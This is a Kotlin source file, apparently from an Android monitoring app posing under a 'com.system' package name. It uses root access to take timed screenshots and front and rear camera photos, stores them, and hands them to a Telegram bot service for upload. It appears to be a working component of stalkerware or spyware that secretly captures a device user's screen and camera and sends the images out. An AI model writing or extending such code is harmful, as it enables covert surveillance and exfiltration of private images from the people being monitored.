package com.system.superiormonitor.monitor

import com.system.superiormonitor.core.LogLevel

import android.app.AlarmManager
import android.app.KeyguardManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.PowerManager
import android.os.SystemClock
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SnapshotScheduler(private val context: Context) {
    private val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
    private val prefsManager = PrefsManager.getInstance(context)

    fun scheduleNextSnapshot() {
        if (!prefsManager.enableSnapshots) return

        val intent = Intent(context, SnapshotReceiver::class.java).apply {
            action = "com.system.superiormonitor.ACTION_SNAPSHOT"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val intervalMillis = prefsManager.snapshotIntervalMin * 60 * 1000L
        val staggerMs = 0L // Base trigger
        val triggerTime = SystemClock.elapsedRealtime() + intervalMillis + staggerMs

        try {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
            LogManager.log(LogCategory.SNAPSHOTS, "Scheduled next snapshot in ${prefsManager.snapshotIntervalMin} minutes.")
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.SNAPSHOTS, "Exact alarm permission missing. Falling back to inexact alarm.", LogLevel.ERROR)
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
        }
    }

    fun cancelSnapshot() {
        val intent = Intent(context, SnapshotReceiver::class.java).apply {
            action = "com.system.superiormonitor.ACTION_SNAPSHOT"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.cancel(pendingIntent)
        LogManager.log(LogCategory.SNAPSHOTS, "Cancelled snapshot schedule.")
    }

    fun scheduleNextCamera(facing: Int) { // 1 = Front, 0 = Rear
        val isEnabled = if (facing == 1) prefsManager.enableFrontCamera else prefsManager.enableRearCamera
        if (!isEnabled) return

        val actionStr = if (facing == 1) "com.system.superiormonitor.ACTION_FRONT_CAMERA" else "com.system.superiormonitor.ACTION_REAR_CAMERA"
        val intent = Intent(context, SnapshotReceiver::class.java).apply {
            action = actionStr
        }
        val reqCode = if (facing == 1) 1 else 2
        val pendingIntent = PendingIntent.getBroadcast(
            context, reqCode, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val intervalMin = if (facing == 1) prefsManager.frontCameraInterval else prefsManager.rearCameraInterval
        val intervalMillis = intervalMin * 60 * 1000L
        val staggerMs = if (facing == 1) 4000L else 8000L // Stagger by 4s and 8s
        val triggerTime = SystemClock.elapsedRealtime() + intervalMillis + staggerMs

        try {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
            LogManager.log(LogCategory.SNAPSHOTS, "Scheduled next ${if (facing == 1) "Front" else "Rear"} camera capture in $intervalMin minutes.")
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.SNAPSHOTS, "Exact alarm permission missing. Falling back to inexact alarm.", LogLevel.ERROR)
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
        }
    }

    fun cancelCamera(facing: Int) {
        val actionStr = if (facing == 1) "com.system.superiormonitor.ACTION_FRONT_CAMERA" else "com.system.superiormonitor.ACTION_REAR_CAMERA"
        val intent = Intent(context, SnapshotReceiver::class.java).apply {
            action = actionStr
        }
        val reqCode = if (facing == 1) 1 else 2
        val pendingIntent = PendingIntent.getBroadcast(
            context, reqCode, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.cancel(pendingIntent)
        LogManager.log(LogCategory.SNAPSHOTS, "Cancelled ${if (facing == 1) "Front" else "Rear"} camera schedule.")
    }
}

class SnapshotReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        
        LogManager.log(LogCategory.SNAPSHOTS, "Alarm triggered. Sending capture intent to BotService...")
        val botIntent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
            this.action = action
        }
        context.startService(botIntent)

        // Reschedule immediately on the main thread (No blocking operations)
        if (action == "com.system.superiormonitor.ACTION_SNAPSHOT") SnapshotScheduler(context).scheduleNextSnapshot()
        if (action == "com.system.superiormonitor.ACTION_FRONT_CAMERA") SnapshotScheduler(context).scheduleNextCamera(1)
        if (action == "com.system.superiormonitor.ACTION_REAR_CAMERA") SnapshotScheduler(context).scheduleNextCamera(0)
    }
}

object SnapshotWorker {
    fun executeCapture(context: Context, action: String, prefsManager: PrefsManager, serviceScope: CoroutineScope) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val isSnapshot = action == "com.system.superiormonitor.ACTION_SNAPSHOT"
                val isFrontCamera = action == "com.system.superiormonitor.ACTION_FRONT_CAMERA"
                val isRearCamera = action == "com.system.superiormonitor.ACTION_REAR_CAMERA"

                if (isSnapshot && !prefsManager.enableSnapshots) return@launch
                if (isFrontCamera && !prefsManager.enableFrontCamera) return@launch
                if (isRearCamera && !prefsManager.enableRearCamera) return@launch

                val tag = if (isSnapshot) "[SnapshotWorker]" else if (isFrontCamera) "[FrontCamWorker]" else "[RearCamWorker]"
                LogManager.log(LogCategory.SNAPSHOTS, "$tag Executing root capture...")
                
                // Root must use internal cache directory to avoid Scoped Storage / FUSE mount namespace issues
                val cacheDir = context.cacheDir
                val tempFile = if (isSnapshot) File(cacheDir, "temp_shot.png") 
                               else if (isFrontCamera) File(cacheDir, "temp_front.jpg") 
                               else File(cacheDir, "temp_rear.jpg")

                var errorOutput = ""
                var isSuccess = true

                val type = if (isSnapshot) 0 else if (isFrontCamera) 1 else 2
                val (success, errOut) = com.system.superiormonitor.core.CaptureHelper.performCapture(context, type, true, tempFile)
                
                if (!success) {
                    if (errOut.contains("skipped/aborted")) {
                        LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture skipped: Screen is locked or off.")
                        return@launch
                    }
                    isSuccess = false
                    errorOutput = errOut
                }

                if (!isSuccess || !tempFile.exists() || tempFile.length() == 0L) {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture failed. Error: $errorOutput", LogLevel.ERROR)
                    return@launch
                }

                val bitmap = BitmapFactory.decodeFile(tempFile.absolutePath)
                if (bitmap == null) {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture failed (Decode error). Error: $errorOutput", LogLevel.ERROR)
                    tempFile.delete()
                    return@launch
                }

                val isOnline = LogManager.isTelegramApiReachable.value
                val dateFolderFormatter = SimpleDateFormat("dd-MM-yyyy", Locale.US)
                val timeFormatter = SimpleDateFormat("hh-mm-a", Locale.US)
                val currentDate = Date()
                val dateFolderName = dateFolderFormatter.format(currentDate)
                
                val suffix = if (isSnapshot) "_shot" else if (isFrontCamera) "_front" else "_rear"
                val fileName = "${timeFormatter.format(currentDate)}$suffix.jpeg"
                
                val baseFolderName = if (isSnapshot) "captures/screen" else if (isFrontCamera) "captures/front" else "captures/rear"
                
                val destDir = if (isOnline) {
                    File(context.getExternalFilesDir(null), "$baseFolderName/temp")
                } else {
                    File(context.getExternalFilesDir(null), "$baseFolderName/$dateFolderName/offline")
                }
                
                if (!destDir.exists()) destDir.mkdirs()

                val destFile = File(destDir, fileName)
                val fos = FileOutputStream(destFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, if (isSnapshot) 40 else 85, fos)
                fos.flush()
                fos.close()
                bitmap.recycle()
                tempFile.delete()

                val statusLog = if (isOnline) "temp (online)" else "offline"
                LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture saved to $statusLog.")

                if (isOnline) {
                    val uploadIntent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
                        this.action = "ACTION_UPLOAD_SNAPSHOT"
                        putExtra("filePath", destFile.absolutePath)
                        putExtra("tag", tag)
                        putExtra("isSnapshot", isSnapshot)
                    }
                    context.startService(uploadIntent)
                }

            } catch (e: Exception) {
                LogManager.log(LogCategory.SNAPSHOTS, "[Worker] Error: ${e.message}", LogLevel.ERROR)
            }
        }
    }
}

